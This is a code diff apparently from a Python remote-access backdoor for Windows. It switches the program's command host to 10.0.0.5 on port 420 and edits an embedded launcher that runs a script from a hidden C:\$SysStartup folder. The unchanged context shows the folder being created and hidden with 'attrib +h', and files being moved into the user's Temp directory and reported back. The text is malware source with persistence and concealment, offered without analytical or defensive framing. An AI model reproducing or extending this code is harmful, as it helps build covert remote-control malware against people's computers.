@@ -6,7 +6,7 @@ from random import randint
 from os import getlogin
 import threading
 
-HOST = "10.0.0.8"
+HOST = "10.0.0.5"
 PORT = 420
 BUFFER = 4096
 FORMAT = "cp850"
@@ -14,8 +14,7 @@ ADDR = (HOST, PORT)
 
 var = """import threading
 from subprocess import call
-
-def a0001(): call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
+def a0001(): call(["python", "C:\$SysStartup\pslib.py"], shell=True)
 a0001 = threading.Thread(target=a0001)
 a0001.start()
 
@@ -86,6 +85,7 @@ def process(message):
         else:
             call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
             sendMsg(name)
+
     elif ctype == "x":
         call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
         message = message[1:]
